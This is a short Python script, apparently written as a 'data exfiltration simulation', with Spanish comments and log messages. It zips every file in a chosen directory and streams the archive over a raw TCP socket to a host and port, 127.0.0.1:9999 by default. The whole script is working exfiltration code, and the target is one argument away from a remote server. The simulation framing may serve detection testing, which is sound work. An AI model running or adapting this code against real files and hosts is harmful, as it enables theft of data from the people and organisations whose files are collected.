import os
import zipfile
import socket
import time

def collect_files(directory="test_data"):
    """Recolecta y comprime archivos de prueba"""
    if not os.path.exists(directory):
        print(f"[-] Error: El directorio {directory} no existe")
        return None
    zip_name = "exfiltrated_data.zip"
    with zipfile.ZipFile(zip_name, "w", zipfile.ZIP_DEFLATED) as zipf:
        for root, _, files in os.walk(directory):
            for file in files:
                file_path = os.path.join(root, file)
                zipf.write(file_path, os.path.relpath(file_path, directory))
                print(f"[+] Archivo recolectado: {file_path}")
    return zip_name

def send_data(zip_name, target="127.0.0.1", port=9999):
    """Simula el envío de datos a un servidor remoto"""
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((target, port))
        with open(zip_name, "rb") as f:
            data = f.read()
        s.sendall(data)
        print(f"[+] Datos enviados a {target}:{port}")
        s.close()
    except Exception as e:
        print(f"[-] Error al enviar datos: {e}")

def main():
    import argparse
    parser = argparse.ArgumentParser(description="Simulación de exfiltración de datos")
    parser.add_argument("--directory", default="test_data", help="Directorio con datos de prueba")
    args = parser.parse_args()

    print("[*] Iniciando simulación de exfiltración de datos...")
    zip_name = collect_files(args.directory)
    if zip_name:
        print("[*] Simulando envío de datos comprimidos...")
        send_data(zip_name)
        print("[*] Simulación completada")

if __name__ == "__main__":
    main()
